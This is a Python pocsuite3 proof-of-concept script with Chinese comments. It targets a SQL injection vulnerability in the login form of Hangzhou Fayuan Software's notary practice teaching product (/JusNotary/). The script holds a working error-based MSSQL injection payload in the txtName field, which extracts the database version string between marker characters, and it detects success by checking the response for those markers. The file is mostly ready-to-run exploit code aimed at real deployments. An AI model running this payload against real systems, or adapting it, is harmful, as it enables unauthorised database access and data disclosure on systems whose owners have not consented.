from collections import OrderedDict
import urllib.parse
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.sessions import session
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-10-20'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-10-20'  # 编写 PoC 的日期
    updateDate = '2021-10-20'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '杭州法源软件 公证实务教学软件SQL注入漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '杭州法源软件 公证实务教学软件'  # 漏洞应用名称
    appVersion = '''杭州法源软件 公证实务教学软件'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
       杭州法源软件 公证实务教学软件 存在SQL注入漏洞
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        path = "/JusNotary/"
        url = self.url + path
        headers={
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data="""__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123'%20and%20%20convert(int%2c(char(94)%2bchar(94)%2bchar(33)%2bcast(substring(%40%40version%2c0%2c60)%20as%20varchar(2000))%2bchar(33)%2bchar(94)%2bchar(94)))%3d1--%20-&txtPwd=123&btnSubmit=+"""
        try:
            resq = requests.post(url=url,data=data,headers=headers)
            if '^^!' in resq.text and '!^^' in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = data
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output 
register_poc(POC)
